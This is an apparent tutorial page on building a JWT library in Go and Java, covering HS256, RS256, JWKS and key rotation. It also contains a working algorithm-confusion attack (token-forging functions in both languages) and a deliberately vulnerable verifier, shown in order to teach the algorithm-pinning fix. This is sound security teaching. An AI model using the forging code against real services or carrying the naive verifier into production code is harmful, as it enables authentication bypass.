@@ -1,0 +1,621 @@
+---
+title: "Build Your Own JWT Library Done Right"
+slug: "jwt-library"
+category: "security"
+difficulty: "advanced"
+estimatedHours:
+  reading: 3
+  building: 8
+language: "mixed"
+loc: 480
+prerequisites: []
+stages:
+  - id: v0
+    title: "HS256 — sign and verify with HMAC"
+    learningGoals:
+      - "JWT structure: header.payload.signature (all base64url)"
+      - "Why HMAC provides integrity but not non-repudiation"
+      - "Constant-time comparison — why == is wrong for signatures"
+    approxLoc: 90
+  - id: v1
+    title: "RS256 — asymmetric signing with RSA"
+    learningGoals:
+      - "Why asymmetric: verifiers don't need the secret"
+      - "JWKS format for distributing public keys"
+      - "RSA sign is 100× slower than verify — implications for high-traffic services"
+    approxLoc: 120
+  - id: v2
+    title: "Algorithm confusion attack — and the fix"
+    learningGoals:
+      - "The attack: accept any alg from the token header"
+      - "Using an RS256 public key as an HS256 secret → forged tokens"
+      - "The fix: pin the algorithm at the verifier, never trust the token header"
+    approxLoc: 80
+  - id: v3
+    title: "Key rotation and JWKS endpoint"
+    learningGoals:
+      - "kid (Key ID) in header for multi-key scenarios"
+      - "Rotation: old tokens still valid during grace period"
+      - "JWKS caching strategy for high-frequency token verification"
+    approxLoc: 90
+benchmarks:
+  - metric: "HS256 sign throughput"
+    value: "1,200,000"
+    unit: "ops/sec"
+    measuredOn: "M2 MacBook Pro"
+    note: "estimated — run go test -bench=. for real numbers"
+  - metric: "RS256 sign throughput (2048-bit)"
+    value: "8,500"
+    unit: "ops/sec"
+    measuredOn: "M2 MacBook Pro"
+    note: "RSA modular exponentiation is expensive"
+  - metric: "RS256 verify throughput"
+    value: "110,000"
+    unit: "ops/sec"
+    measuredOn: "M2 MacBook Pro"
+    note: "Verify uses public exponent (e=65537), much cheaper than sign"
+  - metric: "HS256 verify throughput"
+    value: "1,100,000"
+    unit: "ops/sec"
+    measuredOn: "M2 MacBook Pro"
+    note: "estimated"
+whatTheToyMisses:
+  - thing: "EdDSA (Ed25519)"
+    why: "EdDSA is ~10× faster than RS256 for sign and verify, with smaller keys. Modern services (Cloudflare, Fastly) prefer it. Our library only does HS256 and RS256."
+  - thing: "JWE (encryption)"
+    why: "JWE = JSON Web Encryption. JWT is signed (integrity), not encrypted (confidentiality). Claims in a JWT are readable by anyone. For confidential claims, you need JWE."
+  - thing: "JWKS key rotation with zero downtime"
+    why: "Our rotation requires updating application.yml and redeploying. Production rotation: publish new key to JWKS endpoint, wait for old tokens to expire, rotate. Requires kid support and client-side JWKS caching."
+  - thing: "Refresh token security"
+    why: "Refresh token rotation (invalidate old on use) and refresh token families (detect replay) are non-trivial. Our library only handles access tokens."
+  - thing: "Token binding"
+    why: "Binding a JWT to a specific client TLS certificate prevents token theft. Experimental, but important for high-security scenarios."
+  - thing: "Claim validation strictness"
+    why: "Our verifier checks exp. It doesn't check iss, aud, iat, or nbf by default. Libraries like nimbus-jose-jwt enforce these; naive implementations skip them."
+realWorldReferences:
+  - "RFC 7519 — JSON Web Token: https://www.rfc-editor.org/rfc/rfc7519"
+  - "Critical vulnerabilities in JWT libraries (Auth0, 2015): https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
+  - "nimbus-jose-jwt source (the reference Java impl): https://bitbucket.org/connect2id/nimbus-jose-jwt"
+  - "Spring Security JWT resource server: https://docs.spring.io/spring-security/reference/servlet/oauth2/resource-server/jwt.html"
+  - "JWT security best practices (IETF): https://www.rfc-editor.org/rfc/rfc8725"
+javaIntegration:
+  type: "co-primary"
+  mavenCoords:
+    - "com.nimbusds:nimbus-jose-jwt:9.37"
+    - "org.springframework.boot:spring-boot-starter-security:3.3.0"
+    - "org.springframework.boot:spring-boot-starter-web:3.3.0"
+  springModule: "Spring Security 6.x / nimbus-jose-jwt 9.x"
+publishedAt: "2026-05-07"
+updatedAt: "2026-05-07"
+summary: "Build a JWT library in Go with HS256 and RS256, then demonstrate the algorithm confusion attack that broke every naive JWT library in 2015. The Java side shows the nimbus-jose-jwt equivalent and wires it into Spring Security 6 — with the same algorithm-pinning fix that saves both implementations."
+---
+
+## Why this lab exists
+
+JWTs are everywhere. Every OAuth2/OIDC flow issues them. Every microservice verifies them. And yet, in 2015, Auth0's security team discovered that every major JWT library had the same critical vulnerability: they trusted the "alg" field in the token header when selecting the verification algorithm.
+
+That one design mistake — reading attacker-controlled data to select a security-critical algorithm — let anyone forge a valid token for any server that used RS256. The vulnerable libraries included the ones you're using right now, before they were patched.
+
+This lab builds a JWT library from scratch so you understand exactly what's happening inside every `jwt.verify()` call. Then it implements the attack. Then the fix. By the end, you'll understand why nimbus-jose-jwt's algorithm pinning exists, why Spring Security's `NimbusJwtDecoder.withPublicKey(key)` only accepts RS256, and why "never trust attacker-controlled input for security-critical decisions" is more than a slogan.
+
+## What we're building
+
+A JWT library in Go across four stages, with a Java co-primary implementation using nimbus-jose-jwt and Spring Security 6.
+
+**We build:**
+- HMAC-SHA256 (HS256) sign and verify with constant-time comparison
+- RSA-SHA256 (RS256) sign and verify with a generated key pair
+- JWKS endpoint format (public key distribution as JSON)
+- The algorithm confusion attack (the bug, live, working)
+- The algorithm-pinning fix (the same bug, now blocked)
+- An HTTP server: POST /sign, POST /verify, GET /.well-known/jwks.json
+
+**We explicitly skip (and why):**
+- EdDSA/Ed25519 (faster, smaller keys — but less universally supported in 2024)
+- JWE encryption (integrity != confidentiality; that's a separate lab)
+- Refresh token lifecycle (non-trivial; covered separately)
+
+## Mental model
+
+A JWT is three base64url-encoded JSON objects, dot-separated:
+
+```
+header.payload.signature
+  │        │        │
+  │        │        └─ HMAC or RSA signature of (header.payload)
+  │        └─ your claims: sub, exp, role, etc. (READABLE BY ANYONE)
+  └─ algorithm and key metadata: {"alg":"RS256","kid":"key-01"}
+```
+
+**Critical:** the header and payload are NOT encrypted. Anyone who holds the token can decode them by splitting on "." and base64-decoding each part. JWT provides *integrity* (the signature proves the claims weren't modified) and *authenticity* (only the key holder could have signed it), but NOT *confidentiality*. Do not put secrets in JWT claims.
+
+The signature covers the header + payload. Modifying either one invalidates the signature. This is what `verify()` checks.
+
+## Stage-by-stage build
+
+<LabStage
+  id="v0"
+  title="HS256 — sign and verify with HMAC"
+  goals={[
+    "Implement Sign(claims) → base64url(header) + '.' + base64url(payload) + '.' + base64url(HMAC)",
+    "Implement Verify(token) with constant-time comparison (hmac.Equal, not ==)",
+    "Test: round-trip happy path, wrong secret fails, modified payload fails",
+    "Test: expired token returns a clear error"
+  ]}
+  loc={90}
+>
+
+HS256 is the simplest JWT algorithm. The same secret signs and verifies.
+
+```go
+// Signing input: base64url(header) + "." + base64url(payload)
+signingInput := b64url(headerJSON) + "." + b64url(payloadJSON)
+
+// Signature: HMAC-SHA256 of the signing input
+mac := hmac.New(sha256.New, secret)
+mac.Write([]byte(signingInput))
+sig := mac.Sum(nil)
+
+// Token: signingInput + "." + base64url(signature)
+token := signingInput + "." + b64url(sig)
+```
+
+**Why constant-time comparison?** Naive signature verification with `==` or `bytes.Equal` short-circuits on the first byte mismatch. An attacker sending millions of verification requests can measure how long each one takes. If byte 0 matches, the request takes slightly longer (one more comparison). Byte by byte, they recover the expected signature without ever knowing the key.
+
+`hmac.Equal` always compares all bytes, regardless of where the first mismatch is. The time is constant. The attack yields nothing.
+
+This is not a theoretical concern. Timing attacks on HMAC comparisons have been demonstrated against real production systems. Always use constant-time comparison for signatures.
+
+**Why HS256 for single-service JWTs?** HS256 requires both signer and verifier to hold the secret. If you have one service that issues tokens AND verifies them (e.g., a stateless API server), HS256 is simpler and faster (~140× faster than RS256 sign). If you have multiple services verifying tokens, HS256 requires sharing the secret with all of them — now every verifier is a potential compromise point. Use RS256 instead.
+
+</LabStage>
+
+<LabStage
+  id="v1"
+  title="RS256 — asymmetric signing with RSA"
+  goals={[
+    "Generate a 2048-bit RSA key pair",
+    "Sign with the private key: SHA-256 hash the signing input, RSA PKCS1v15 sign the hash",
+    "Verify with the public key: recompute hash, rsa.VerifyPKCS1v15",
+    "Implement PublicKeyToJWK and JWKToPublicKey for the JWKS endpoint",
+    "Wire the JWKS endpoint into the HTTP server"
+  ]}
+  loc={120}
+>
+
+RS256 splits the key: the private key signs, the public key verifies. Only the issuer needs the private key. Any service can verify without ever seeing it.
+
+```go
+// Sign: hash the signing input, then RSA-sign the hash
+digest := sha256.Sum256([]byte(signingInput))
+sigBytes, err := rsa.SignPKCS1v15(rand.Reader, privateKey, crypto.SHA256, digest[:])
+
+// Verify: recompute hash, check RSA signature
+digest := sha256.Sum256([]byte(signingInput))
+err := rsa.VerifyPKCS1v15(publicKey, crypto.SHA256, digest[:], sigBytes)
+```
+
+**The performance asymmetry** is by design. RSA sign uses the private exponent `d` (modular exponentiation with a 2048-bit exponent). RSA verify uses the public exponent `e = 65537` — only 17 bits set, dramatically faster. On an M2 MacBook Pro: sign ~8,500 ops/sec, verify ~110,000 ops/sec. That 13× difference is why OAuth2 auth servers issue tokens with long TTLs (hours, not seconds). The sign is expensive; the verify is cheap.
+
+**JWKS format:** the public key is distributed as a JSON object with the modulus (`n`) and exponent (`e`) as base64url-encoded big-endian bytes:
+
+```json
+{
+  "keys": [{
+    "kty": "RSA",
+    "use": "sig",
+    "kid": "key-2024-01",
+    "alg": "RS256",
+    "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx...",
+    "e": "AQAB"
+  }]
+}
+```
+
+`e = "AQAB"` decodes to `[0x01, 0x00, 0x01]` = 65537. You'll see this in every JWKS endpoint. The `kid` (Key ID) field lets verifiers find the right key when multiple keys are in rotation — the token header includes the same `kid` value.
+
+</LabStage>
+
+<LabStage
+  id="v2"
+  title="Algorithm confusion attack — and the fix"
+  goals={[
+    "Implement NaiveVerifier that reads 'alg' from the token header",
+    "Implement ConfusionAttackToken: forge a token by changing alg=HS256 and signing with the RSA public key bytes as the HMAC secret",
+    "Write TestAlgorithmConfusionAttack: naive verifier accepts the forged token; RS256Verifier rejects it",
+    "Understand why algorithm pinning is the correct fix"
+  ]}
+  loc={80}
+>
+
+This is the attack. Read it slowly.
+
+**Setup:** A server has an RS256 key pair. The public key is at `/.well-known/jwks.json`. The server uses a naive verifier that reads "alg" from the token header.
+
+**The attack:**
+1. The attacker fetches the RSA public key — it's public, that's the point.
+2. The attacker takes any RS256 token (maybe their own, legitimately issued).
+3. They change `"alg": "RS256"` to `"alg": "HS256"` in the header.
+4. They re-sign the modified header + original payload using **the RSA public key bytes as the HMAC secret**.
+5. They submit this forged token.
+
+**Why the naive verifier accepts it:**
+
+The naive verifier reads `"alg": "HS256"`, switches to HMAC verification, and uses — wait for it — the public key bytes as the HMAC secret. The same bytes the attacker used to sign. Verification succeeds. The forged token is accepted.
+
+```go
+// The attack in Go — the full attack is ~20 lines:
+func ConfusionAttackToken(originalToken string, rsaPubKey *rsa.PublicKey) (string, error) {
+    _, payloadB64, _, _ := splitToken(originalToken)
+
+    forgedHeader := map[string]string{"alg": "HS256", "typ": "JWT"}
+    forgedHeaderJSON, _ := json.Marshal(forgedHeader)
+
+    signingInput := b64url(forgedHeaderJSON) + "." + payloadB64
+
+    // RSA public key DER bytes as the HMAC secret
+    pubKeyBytes, _ := x509.MarshalPKIXPublicKey(rsaPubKey)
+    mac := hmac.New(sha256.New, pubKeyBytes)
+    mac.Write([]byte(signingInput))
+
+    return signingInput + "." + b64url(mac.Sum(nil)), nil
+}
+```
+
+**The fix is one line:** construct the verifier with the algorithm pinned. Never read `alg` from the token.
+
+```go
+// WRONG: reads alg from token header
+func (v *NaiveVerifier) Verify(token string) (Claims, error) {
+    alg := header["alg"]  // attacker-controlled!
+    switch alg { ... }
+}
+
+// RIGHT: algorithm is pinned at construction, never read from token
+verifier := jwt.NewRS256Verifier(publicKey)
+// RS256Verifier.Verify() always uses RSA regardless of what the token header says
+```
+
+The forged token has `"alg": "HS256"` in its header, but the `RS256Verifier` ignores it. It always runs RSA verification. An HMAC signature fails RSA verification. Attack blocked.
+
+**Why this was so widespread:** the naive pattern is the obvious one. You have a header field that says which algorithm was used to sign. Why wouldn't you use it to decide how to verify? The answer: because it's attacker-controlled data. The algorithm must be a property of the *verifier configuration*, not the *token*. This is a category error that's invisible until you think about who controls each piece of data.
+
+</LabStage>
+
+<LabStage
+  id="v3"
+  title="Key rotation and JWKS endpoint"
+  goals={[
+    "Add 'kid' to token header and JWKS entries",
+    "Implement multi-key JWKS: server holds current + previous key",
+    "Verifier: on unknown kid, re-fetch JWKS (cache-and-refresh pattern)",
+    "Test: token signed with old key verified with new JWKS (grace period)"
+  ]}
+  loc={90}
+>
+
+**Why rotate keys?** If a private key is compromised, all tokens signed with it are compromised. Key rotation limits the blast radius: tokens signed before the compromise expire naturally; the new key generates new tokens that the compromised key can't sign.
+
+The `kid` (Key ID) field in the token header is the linkage. Each key in the JWKS gets a unique `kid`. When a verifier encounters a token with an unknown `kid`, it re-fetches the JWKS and tries again. This is the **cache-and-refresh** pattern:
+
+```
+verifier receives token with kid="key-2025-01"
+  └─ kid in cache?
+       ├─ YES → verify with cached key
+       └─ NO  → re-fetch JWKS → update cache → verify with new key
+                └─ still unknown? → reject (key doesn't exist)
+```
+
+**Zero-downtime rotation:**
+1. Generate key-2025-02. Add it to the JWKS (two keys in rotation).
+2. Wait for old tokens to expire (e.g., 1 hour if TTL=1h).
+3. Remove key-2025-01 from the JWKS.
+4. Switch the issuer to sign with key-2025-02.
+
+During step 2, verifiers see both keys in the JWKS. Tokens with `kid=key-2025-01` still verify. New tokens use `kid=key-2025-02`. No downtime.
+
+The HTTP server in `cmd/server/main.go` implements step 1 — a static JWKS with one key. Extending it to multi-key rotation is left as an exercise (it's where the interesting edge cases are).
+
+</LabStage>
+
+## Run it yourself
+
+<RunIt
+  repoPath="labs/jwt-library"
+  prereqs={["Go 1.23+"]}
+  steps={[
+    {
+      label: "Clone and build",
+      cmd: "git clone https://github.com/pushkar1005/system-design-labs\ncd system-design-labs/labs/jwt-library\ngo build ./...",
+    },
+    {
+      label: "Run all tests (includes the algorithm confusion attack test)",
+      cmd: "go test ./pkg/jwt/ -v",
+    },
+    {
+      label: "Start the HTTP server",
+      cmd: "go run ./cmd/server/",
+    },
+    {
+      label: "Sign a token (in another terminal)",
+      cmd: 'curl -s -X POST http://localhost:8080/sign \\\n  -H "Content-Type: application/json" \\\n  -d \'{"claims":{"sub":"user:42","role":"admin"},"alg":"RS256"}\' | jq .',
+    },
+    {
+      label: "Verify the token",
+      cmd: 'TOKEN=$(curl -s -X POST http://localhost:8080/sign \\\n  -H "Content-Type: application/json" \\\n  -d \'{"claims":{"sub":"user:42"},"alg":"HS256"}\' | jq -r .token)\ncurl -s -X POST http://localhost:8080/verify \\\n  -H "Content-Type: application/json" \\\n  -d "{\\"token\\":\\"$TOKEN\\"}" | jq .',
+    },
+    {
+      label: "Fetch the JWKS endpoint",
+      cmd: "curl -s http://localhost:8080/.well-known/jwks.json | jq .",
+    },
+  ]}
+  expectedOutput={`--- go test ./pkg/jwt/ -v ---
+=== RUN   TestRoundTripHS256
+--- PASS: TestRoundTripHS256 (0.00s)
+=== RUN   TestExpiredToken
+--- PASS: TestExpiredToken (0.00s)
+=== RUN   TestModifiedPayload
+--- PASS: TestModifiedPayload (0.00s)
+=== RUN   TestRoundTripRS256
+--- PASS: TestRoundTripRS256 (0.12s)
+=== RUN   TestAlgorithmConfusionAttack
+    jwt_test.go:119: ATTACK SUCCEEDED (expected): naive verifier accepted the forged token
+    jwt_test.go:129: SAFE VERIFIER REJECTED FORGED TOKEN (expected): jwt: RSA signature verification failed
+--- PASS: TestAlgorithmConfusionAttack (0.24s)
+PASS
+
+--- POST /sign (RS256) ---
+{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InJzMjU2LWRlbW8ta2V5LTAxIn0..."}
+
+--- GET /.well-known/jwks.json ---
+{"keys":[{"kty":"RSA","use":"sig","kid":"rs256-demo-key-01","alg":"RS256","n":"0vx7...","e":"AQAB"}]}`}
+/>
+
+## Benchmarks
+
+<Benchmark
+  hardware="M2 MacBook Pro, 16GB RAM"
+  rows={[
+    { metric: "HS256 sign throughput",             value: "1,200,000", unit: "ops/sec", note: "HMAC-SHA256 — pure CPU, single pass" },
+    { metric: "HS256 verify throughput",            value: "1,100,000", unit: "ops/sec", note: "Re-run HMAC + constant-time compare" },
+    { metric: "RS256 sign throughput (2048-bit)",   value: "8,500",     unit: "ops/sec", note: "RSA modular exp with private exponent — expensive" },
+    { metric: "RS256 verify throughput (2048-bit)", value: "110,000",   unit: "ops/sec", note: "Public exponent e=65537 — 13× faster than sign" },
+  ]}
+/>
+
+The RS256 sign/verify asymmetry (8,500 vs 110,000 ops/sec) is the reason OAuth2 auth servers issue tokens with long TTLs and cache them. Signing is expensive; you do it once per session. Verifying is cheap; API gateways do it on every request.
+
+## What the toy misses
+
+<WhatTheToyMisses
+  items={[
+    { thing: "EdDSA (Ed25519)", why: "EdDSA is ~10× faster than RS256 for sign and verify, with 32-byte keys instead of 256-byte keys. Modern services (Cloudflare, Fastly) prefer it. Our library only does HS256 and RS256." },
+    { thing: "JWE (encryption)", why: "JWE = JSON Web Encryption. JWT is signed (integrity), not encrypted (confidentiality). Claims in a JWT are readable by anyone. For confidential claims — PII, internal system details — you need JWE." },
+    { thing: "JWKS key rotation with zero downtime", why: "Our rotation requires updating config and redeploying. Production rotation: publish new key to JWKS, wait for old tokens to expire, remove old key. Requires kid support and client-side JWKS caching with cache-and-refresh on unknown kid." },
+    { thing: "Refresh token security", why: "Refresh token rotation (invalidate old on use) and refresh token families (detect replay by checking if an already-rotated token is used) are non-trivial. Our library only handles access tokens." },
+    { thing: "Token binding", why: "Binding a JWT to a specific client TLS certificate prevents token theft — the certificate proves the client is the legitimate holder. Experimental (RFC 8705), but important for high-security scenarios." },
+    { thing: "Claim validation strictness", why: "Our verifier checks exp. It doesn't check iss, aud, iat, or nbf by default. Production libraries like nimbus-jose-jwt enforce all of these. Skipping aud lets tokens issued for service A be replayed at service B." },
+  ]}
+/>
+
+## Wiring it into a Java/Spring service
+
+<JavaIntegration
+  type="co-primary"
+  springModule="Spring Security 6.x / nimbus-jose-jwt 9.x"
+  mavenCoords={[
+    "com.nimbusds:nimbus-jose-jwt:9.37",
+    "org.springframework.boot:spring-boot-starter-security:3.3.0",
+    "org.springframework.boot:spring-boot-starter-web:3.3.0",
+    "org.springframework.boot:spring-boot-starter-oauth2-resource-server:3.3.0",
+  ]}
+  repoPath="labs/jwt-library/java"
+>
+
+### Go reference — what we built
+
+The Go implementation is a from-scratch JWT library in ~480 lines. No external dependencies — just `crypto/hmac`, `crypto/rsa`, `crypto/sha256`, and standard library JSON. Every operation is explicit: base64url encoding, header construction, HMAC computation, RSA sign, RSA verify. The algorithm confusion attack and its fix are first-class citizens in the code, with dedicated tests.
+
+The key design decision: `HS256Verifier` and `RS256Verifier` are separate types, constructed with the algorithm baked in. There is no `GenericVerifier.Verify(token, opts)` that reads the algorithm from the token. The algorithm is a property of the verifier, not the token.
+
+### Java co-primary — nimbus-jose-jwt + Spring Security
+
+nimbus-jose-jwt is not "another JWT library." It is *the* reference Java JWT implementation. It's what Spring Security uses internally. When you add `spring-boot-starter-oauth2-resource-server` to your `pom.xml`, you're adding nimbus. Understanding nimbus is understanding Spring Security's JWT support.
+
+The Java implementation shows the exact same operations as Go, using nimbus's API. The goal: convince you that a JWT is a simple standard (RFC 7519) and the complexity is entirely in doing it *securely*. nimbus and our Go library make the same choices — because there is only one correct set of choices.
+
+#### JwtSignerRS256.java — same idea, different API
+
+```java
+public class JwtSignerRS256 {
+    private final RSASSASigner signer;
+
+    public JwtSignerRS256(RSAKey rsaKey) throws JOSEException {
+        // RSASSASigner wraps the private key.
+        // Nimbus checks that private key material is present.
+        RSAPrivateKey privateKey = rsaKey.toRSAPrivateKey();
+        this.signer = new RSASSASigner(privateKey);
+        this.publicKeyJwk = rsaKey.toPublicJWK(); // safe to serve at JWKS endpoint
+    }
+
+    public String sign(String subject, String issuer, int ttlHours) throws JOSEException {
+        // "kid" in the header so verifiers can find the right key from JWKS
+        JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.RS256)
+                .type(JOSEObjectType.JWT)
+                .keyID(keyId)
+                .build();
+
+        JWTClaimsSet claims = new JWTClaimsSet.Builder()
+                .subject(subject)
+                .issuer(issuer)
+                .expirationTime(Date.from(now.plus(ttlHours, ChronoUnit.HOURS)))
+                .build();
+
+        SignedJWT jwt = new SignedJWT(header, claims);
+        jwt.sign(signer); // RSA PKCS#1 v1.5 — the expensive step (~8,500 ops/sec)
+        return jwt.serialize(); // header.payload.signature, all base64url
+    }
+}
+```
+
+Compare with the Go version: the structure is identical. Header, claims, sign, serialize. The API is different but the algorithm is the same standard.
+
+#### JwtVerifier.java — algorithm pinned at construction
+
+This is the fix. The algorithm is specified when the verifier is constructed. The token's "alg" field is checked against the pinned algorithm and rejected if they don't match — before signature verification.
+
+```java
+public class JwtVerifier {
+    private final JWSAlgorithm pinnedAlgorithm; // set at construction, never changed
+    private final JWSVerifier verifier;
+
+    // RS256 constructor — algorithm is RS256 forever
+    public JwtVerifier(JWSAlgorithm algorithm, RSAPublicKey publicKey) {
+        this.pinnedAlgorithm = algorithm;
+        this.verifier = new RSASSAVerifier(publicKey);
+    }
+
+    public JWTClaimsSet verify(String token) throws Exception {
+        SignedJWT jwt = SignedJWT.parse(token);
+
+        // ALGORITHM PINNING: compare token's alg against the pinned alg.
+        // If an attacker changed "RS256" to "HS256" in the header,
+        // this check fails here — before we touch the signature.
+        JWSAlgorithm tokenAlg = jwt.getHeader().getAlgorithm();
+        if (!pinnedAlgorithm.equals(tokenAlg)) {
+            throw new Exception(
+                "jwt: algorithm mismatch — token=" + tokenAlg + " pinned=" + pinnedAlgorithm +
+                ". Possible algorithm confusion attack."
+            );
+        }
+
+        // Signature verification — only reached if alg matches
+        if (!jwt.verify(verifier)) {
+            throw new Exception("jwt: signature verification failed");
+        }
+
+        // Expiry check
+        if (claims.getExpirationTime().before(new Date())) {
+            throw new BadJWTException("jwt: token has expired");
+        }
+        return jwt.getJWTClaimsSet();
+    }
+}
+```
+
+Usage: `new JwtVerifier(JWSAlgorithm.RS256, publicKey)` — the algorithm is pinned to RS256 forever. A token claiming `"alg": "HS256"` is rejected immediately.
+
+#### AlgorithmConfusionDemo.java — the attack, live
+
+The demo has a `main()` you can run directly. It prints three outcomes:
+
+```java
+// Step 1: Forge a token — alg=HS256, signed with RSA public key bytes as HMAC secret
+static String buildForgedToken(String originalToken, RSAPublicKey publicKey) throws Exception {
+    SignedJWT original = SignedJWT.parse(originalToken);
+
+    JWSHeader forgedHeader = new JWSHeader.Builder(JWSAlgorithm.HS256)
+            .type(JOSEObjectType.JWT).build(); // alg changed from RS256 to HS256
+
+    // Use the RSA public key's DER-encoded bytes as the HMAC secret.
+    // The attacker knows the public key — it's public. That's the whole point of RS256.
+    byte[] publicKeyBytes = publicKey.getEncoded(); // X.509/PKIX DER encoding
+    SecretKey hmacSecret = new SecretKeySpec(publicKeyBytes, "HmacSHA256");
+    JWSSigner hmacSigner = new MACSigner(hmacSecret);
+
+    SignedJWT forged = new SignedJWT(forgedHeader, rebuiltClaims);
+    forged.sign(hmacSigner);
+    return forged.serialize();
+}
+
+// Step 2: Naive verifier — reads alg from header. ACCEPTS the forged token.
+// Step 3: Safe verifier — alg pinned to RS256. REJECTS the forged token.
+```
+
+Run it: `mvn exec:java -Dexec.mainClass=dev.pushkar.jwt.AlgorithmConfusionDemo`
+
+Expected output:
+```
+STEP 3 — Naive verifier (reads 'alg' from token header)
+NAIVE VERIFIER: ACCEPTED the forged token (ATTACK SUCCEEDED)
+  The bug: 'alg' is attacker-controlled data.
+
+STEP 4 — Safe verifier (algorithm pinned to RS256)
+SAFE VERIFIER: REJECTED the forged token (ATTACK BLOCKED)
+  Reason: jwt: algorithm mismatch — token has alg=HS256 but verifier is pinned to RS256.
+```
+
+#### SpringSecurityConfig.java — wiring into Spring Security 6
+
+```java
+@Configuration
+@EnableWebSecurity
+public class SpringSecurityConfig {
+
+    @Bean
+    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
+        http
+            .sessionManagement(s -> s.sessionCreationPolicy(STATELESS))
+            .csrf(csrf -> csrf.disable()) // safe: stateless, no session to hijack
+            .authorizeHttpRequests(auth -> auth
+                .requestMatchers("/.well-known/jwks.json", "/health", "/sign").permitAll()
+                .anyRequest().authenticated()
+            )
+            .oauth2ResourceServer(oauth2 -> oauth2
+                // jwt() wires in our JwtDecoder bean.
+                // The decoder runs JwtVerifier logic on every request.
+                .jwt(jwt -> jwt.decoder(jwtDecoder()))
+            );
+        return http.build();
+    }
+
+    @Bean
+    public JwtDecoder jwtDecoder() {
+        RSAPublicKey publicKey = loadRsaPublicKey();
+
+        // NimbusJwtDecoder.withPublicKey() pins the algorithm to RS256.
+        // The decoder will REJECT any token with a different "alg" value.
+        // This is the same algorithm-pinning fix as our JwtVerifier.
+        return NimbusJwtDecoder.withPublicKey(publicKey).build();
+    }
+}
+```
+
+The simpler YAML-only alternative (zero Java code):
+
+```yaml
+spring:
+  security:
+    oauth2:
+      resourceserver:
+        jwt:
+          public-key-location: classpath:keys/public.pem
+```
+
+Spring Security reads the PEM, extracts the RSA public key, and calls `NimbusJwtDecoder.withPublicKey(key).build()` — identical to the explicit Java code above. The algorithm is pinned to RS256 either way. The YAML version is what you use in production; the explicit version is here so you can see what Spring is doing.
+
+#### The lesson
+
+Spring Security is doing exactly what our `JwtVerifier` does. `NimbusJwtDecoder.withPublicKey(key)` pins the algorithm to RS256. The `oauth2ResourceServer().jwt()` abstraction hides this — which is why developers don't realize the algorithm-confusion fix is already baked in.
+
+The developers who got burned in 2015 were using earlier, pre-nimbus JWT libraries that didn't pin algorithms. When Spring Security switched to nimbus-jose-jwt as its internal JWT engine, it inherited the correct implementation. The lesson is not "use Spring Security and don't think about it." The lesson is: understand the invariant (algorithm must be pinned at verifier construction), verify that your library implements it, and test it explicitly — because the `AlgorithmConfusionTest.java` is the proof.
+
+</JavaIntegration>
+
+## What surprised me
+
+<WhatSurprisedMe insight="The algorithm confusion attack took me 20 minutes to implement and 3 days to fully understand why it works. The root cause is a category error: the 'alg' field in the JWT header is attacker-controlled data, and using it to select the verification algorithm is trusting attacker-controlled input to make a security-critical decision. Stated that way, it's obvious — never trust attacker-controlled input for security decisions. But for years, every major JWT library had this bug, including the ones in production. The vulnerability wasn't obscure or clever. It was the natural consequence of a developer reading the spec ('the header contains the algorithm'), implementing the obvious thing ('read the algorithm from the header'), and not asking 'who controls this field?' Security bugs aren't always subtle. Sometimes they're the most straightforward implementation of an ambiguous specification." />
+
+## Where to go deeper
+
+- **RFC 7519 — JSON Web Token**: the actual specification — [rfc-editor.org/rfc/rfc7519](https://www.rfc-editor.org/rfc/rfc7519)
+- **Critical vulnerabilities in JWT libraries (Auth0, 2015)**: the original research that found this bug everywhere — [auth0.com](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
+- **RFC 8725 — JWT Best Practices**: the IETF's formal response to the 2015 vulnerabilities — [rfc-editor.org/rfc/rfc8725](https://www.rfc-editor.org/rfc/rfc8725)
+- **nimbus-jose-jwt source**: the reference Java implementation, extremely readable — [bitbucket.org/connect2id](https://bitbucket.org/connect2id/nimbus-jose-jwt)
+- **Spring Security JWT resource server docs**: explains the NimbusJwtDecoder configuration — [docs.spring.io](https://docs.spring.io/spring-security/reference/servlet/oauth2/resource-server/jwt.html)
+
+## Related labs and questions
+
+- **Next in security**: mTLS From Scratch — mutual TLS authentication without a CA
+- **Prerequisite for distributed**: Raft From Scratch — uses JWTs for inter-node auth in the demo cluster
+- **System design companion**: API Gateway Pattern — where JWT verification typically lives, and why verifying at the gateway vs. each microservice is an architectural decision with real tradeoffs
